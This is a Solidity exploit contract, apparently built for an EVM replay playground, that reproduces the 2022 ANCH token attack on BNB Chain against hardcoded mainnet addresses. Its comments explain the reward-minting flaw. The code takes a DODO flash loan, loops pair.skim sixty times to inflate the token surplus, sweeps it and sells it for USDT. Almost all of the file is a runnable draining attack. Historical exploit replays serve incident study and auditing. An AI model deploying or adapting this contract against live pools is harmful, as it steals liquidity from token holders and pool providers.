// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-ANCH).
//
// The DeFiHackLabs PoC (test/ANCH_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself (`assetTo = address(this)`),
// `attacker = address(this)`, and profit is measured as
// `USDT.balanceOf(address(this))`. There is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack (the
// testExploit body + DPPFlashLoanCall callback + minimal inline interfaces — no
// imports so it compiles anywhere), compiled inside the registry forge project.
// Logic and constants are copied verbatim from test/ANCH_exp.sol.
//
// Root cause: ANCHToken is a reflection token that pays a 0.05% "transaction
// reward" on every transfer where one endpoint is the ANCH/USDT pair
// (`sender == uniswapV2Pair` ⇒ "buy"; `recipient == uniswapV2Pair` ⇒ "sell"),
// minting the reward out of the contract's own reflection balance. The reward
// is gated ONLY on the IDENTITY of a transfer endpoint, never on whether real
// value moved. PancakeSwap's `pair.skim(to)` performs an ERC-20 `transfer` FROM
// the pair, so it satisfies the `sender == uniswapV2Pair` branch and triggers a
// reward — even when `to` is the pair itself and NO swap or value changed
// hands. The attacker buys ANCH, dumps it into the pair to create a surplus,
// then calls `skim(pair)` in a loop: each skim mints a fresh ~0.05% reward into
// the pair (its balance ratchets up while the reserve never changes). One final
// `skim(attacker)` sweeps the inflated surplus out, which is then sold back to
// the pair for ~526 USDT of pure pool liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ANCHDrain {
    IERC20 constant ANCH = IERC20(0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair constant Pair = IUniswapV2Pair(0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb);
    IUniswapV2Router02 constant Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;

    function run() external {
        USDT.approve(address(Router), type(uint256).max);
        ANCH.approve(address(Router), type(uint256).max);
        // Flash-loan 50,000 USDT from the DODO DPP pool. The callback below
        // executes the attack and repays the loan within this same tx.
        IDVM(DODO).flashLoan(0, 50_000 * 1e18, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // 1. Buy ANCH with the flash-loaned USDT (also collects a buy reward).
        buyANCH();
        // 2. Dump all bought ANCH into the pair, creating a balance > reserve surplus.
        ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));
        // 3. skim(pair) × 60: each transfers the surplus pair→pair (sender == pair),
        //    so ANCHToken mints a 0.05% reward into the pair out of thin air — the
        //    surplus (and so every subsequent reward) grows ~123.99 ANCH per call.
        for (uint256 index = 0; index < 60; index++) {
            Pair.skim(address(Pair));
        }
        // 4. skim(this): sweep the entire inflated surplus to the attacker contract.
        Pair.skim(address(this));
        // 5. Sell the inflated ANCH back to the pair for USDT, then repay the loan.
        sellANCH();
        USDT.transfer(DODO, 50_000 * 1e18);
    }

    function buyANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(ANCH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(ANCH);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ANCH.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
